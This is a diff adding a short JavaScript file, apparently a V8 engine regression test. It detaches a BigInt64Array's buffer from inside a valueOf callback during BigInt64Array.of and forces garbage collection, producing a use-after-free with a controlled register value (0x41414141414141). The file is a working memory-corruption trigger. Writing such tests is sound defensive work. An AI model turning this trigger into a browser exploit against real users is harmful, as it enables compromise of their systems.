@@ -1,0 +1,18 @@
+// flags: --allow-natives-syntax --expose-gc
+
+var array = new BigInt64Array(11);
+
+function evil_callback() {
+  %ArrayBufferNeuter(array.buffer);
+  gc();
+  return 71748523475265n - 16n; // rax: 0x41414141414141
+}
+
+var evil_object = {valueOf: evil_callback}
+
+var root = BigInt64Array.of.call(
+  function() { return array },
+  evil_object
+)
+
+gc(); // trigger
